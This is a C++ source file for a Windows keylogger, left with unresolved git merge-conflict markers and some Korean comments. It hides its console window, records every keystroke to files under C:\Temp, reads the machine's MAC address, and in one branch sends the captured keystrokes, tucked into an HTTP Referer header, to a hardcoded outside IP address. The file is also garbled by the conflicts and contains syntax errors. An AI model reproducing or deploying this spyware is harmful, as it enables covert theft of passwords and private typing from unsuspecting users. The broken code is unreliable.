<<<<<<< HEAD
#define _WINSOCK_DEPCRECATED 
#include "stdafx.h"
#include <winsock2.h>
=======
#include "stdafx.h"
#pragma comment(lib, "ws2_32.lib")

>>>>>>> Merge_mij992900
#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include <string.h>
#include <stdlib.h>
<<<<<<< HEAD
#pragma comment(lib, "ws2_32.lib")

#define ip "35.193.14.199"
using namespace std;

void file_name(char *old, int cnt);
void txt_reset();
int Save(int key_stroke, char *file);
void Stealth();
int send_textfile(char *mac, char *log);

int main(int argc, char** argv))
{
	char i, mac_address[100] = "00:03:FF"; // A function that accepts a Mac address is being implemented
	int textcnt = 0, notepadcnt = 0; // We implemented 10 temporary text files
	char txtname[14] = "C:\\Temp\\0.txt";
	char log[256];
	char *start = argv[0];
	Stealth();
	txt_reset();
	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				textcnt++;
				Save(i, txtname);
				if (textcnt >= 15) // full (15 characters)
				{
					notepadcnt++;
					textcnt = 0;
					FILE *tfp = fopen(txtname, "r");
					if (tfp == NULL)
						return -1;
					fgets(log, 255, tfp); // read txt and write log
					fclose(tfp);
					send_textfile(mac_address, log);
					if (notepadcnt >= 10) // More than 10 txtfile
					{
						notepadcnt = 0;
						txt_reset();
					}
					strcpy(txtname, "C:\\Temp\\0.txt");
					file_name(txtname, notepadcnt);
					strcpy(log, ""); // initialize log
				}
			}
		}
	}
	system("PAUSE");
	return 0;
}

void file_name(char *tname, int ncnt) //change notepad name, example 0.txt 1.txt ... 9.txt
{
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < ncnt; ti++)
		(*tfile_num)++;
}

void txt_reset() //Initialize the contents of Notepad
{
	char tname[14] = "C:\\Temp\\0.txt";
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < 10; ti++)
	{
		FILE *tf = fopen(tname, "w+");
		if (tf == NULL)
			return;
		fclose(tf);
		(*tfile_num)++;
	}
}

int Save(int key_stroke, char *file) //Save the text in Notepad
=======
#include<WinSock.h>
#include<IPHlpApi.h>
#pragma comment(lib, "iphlpapi.lib" )

using namespace std;
int Save(int key_stroke, char *file);
void Stealth();


void user_Address()//mac_address 불러오는 함수
{
	char strMac[256];
	char username[500] = "C:\\Temp\\UserMac.txt";
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(username, "a+");

	DWORD size = sizeof(PIP_ADAPTER_INFO);
	PIP_ADAPTER_INFO Info;
	ZeroMemory(&Info, size);
	int result = GetAdaptersInfo(Info, &size);//첫번째 랜카드 Mac adrress 가져오기
	if (result == ERROR_BUFFER_OVERFLOW)//getadaptersinfo가 메모리 부족하면 재할당하고 재호출
	{
		Info = (PIP_ADAPTER_INFO)malloc(size);
		GetAdaptersInfo(Info, &size);
	}

	sprintf(strMac, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",
		Info->Address[0], Info->Address[1], Info->Address[2], Info->Address[3], Info->Address[4], Info->Address[5]);

	fprintf(OUTPUT_FILE, "%s", strMac);
	fclose(OUTPUT_FILE);
}


int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
>>>>>>> Merge_mij992900
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
<<<<<<< HEAD
		fprintf(OUTPUT_FILE, "%s", "\n");
=======
		fprintf(OUTPUT_FILE, "%s", "[Enter]");
>>>>>>> Merge_mij992900
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
<<<<<<< HEAD
=======
	else if (key_stroke == 186)
		fprintf(OUTPUT_FILE, "%s", "@");
	else if (key_stroke >= 96 && key_stroke <= 105)
		fprintf(OUTPUT_FILE, "%c", (key_stroke - 48));
	else if (key_stroke == 106)
		fprintf(OUTPUT_FILE, "%s", "*");
	else if (key_stroke == 107)
		fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 111)
		fprintf(OUTPUT_FILE, "%s", "/");
>>>>>>> Merge_mij992900
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}
<<<<<<< HEAD
void Stealth()
=======
void Stealth()//콘솔창 숨기기
>>>>>>> Merge_mij992900
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
<<<<<<< HEAD
}

int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of txtfile
{
	char text[10000] = "";
	char trans[100000] = "";
	char static_1[10000] = "GET /4500/recve.php HTTP/1.1\r\n";
	char server_host[10000] = "Host: 35.193.14.199 \r\n";
	char referer[10000] = "Referer:";
	char finish[10000] = "Connection: close\r\n\r\n";

	char *macp = mac;
	for (; *macp; macp++)
	{
		if (*macp == ':')
			*macp = '!';
	}
	printf("\n%s\n", mac);
	strcat(text, mac); strcat(text, "<identity>"); strcat(text, log);
	strcat(referer, text); strcat(referer, "\r\n");
	strcat(trans, static_1);
	strcat(trans, server_host);
	strcat(trans, referer);
	strcat(trans, finish);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		system("pause");
		return 1;
	}

	SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct hostent *host;

	host = gethostbyname(ip);

	SOCKADDR_IN SockAddr;

	SockAddr.sin_port = htons(80);

	SockAddr.sin_family = AF_INET;

	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	cout << "Connecting...\n";

	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
		cout << "Could not connect";
		system("pause");
		return 1;
	}
	cout << "Connected.\n";

	send(Socket, trans, strlen(trans), 0);

	char buffer[10000];
	int nDataLength;

	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
		int i = 0;
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
			cout << buffer[i];
			i += 1;
		}
	}
	closesocket(Socket);
	WSACleanup();
	//system("pause");
	return 0;
=======
>>>>>>> Merge_mij992900
}